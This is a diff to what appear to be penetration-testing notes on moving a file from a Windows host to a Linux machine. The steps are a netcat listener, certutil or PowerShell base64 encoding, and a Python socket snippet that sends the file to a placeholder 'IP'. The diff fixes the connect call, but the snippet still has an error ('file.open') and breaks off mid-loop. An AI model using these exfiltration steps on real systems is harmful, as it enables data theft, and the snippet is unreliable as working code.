@@ -8,12 +8,13 @@
 	2. Open nc listener on Linux and send to out file, `nc -lp 8000 > out.txt`
 	3. Prep file for transfer on Windows with Powershell `certutil -encode IN_FILE OUT_FILE`
 		1. But we get some START and END CERTIFICATE stuff, and new lines every X amount of chars. Whatever, just transfer that for now.
+		2. Alternatively, use Powershell `[Convert]::ToBase64String([IO.File]::ReadAllBytes("path\to\file"))`
 	4. Launch python.exe and use sockets to connect to the listener
 	```
 	#this may not be verbatim... just a reference
 	import socket
 	s = socket.socket()
-	s.connect('IP', 8000)
+	s.connect(('IP', 8000))
 	f = file.open(r'NOTEPAD.EXE_PATH','rb')
 	l = f.read(1024)
 	while (l):
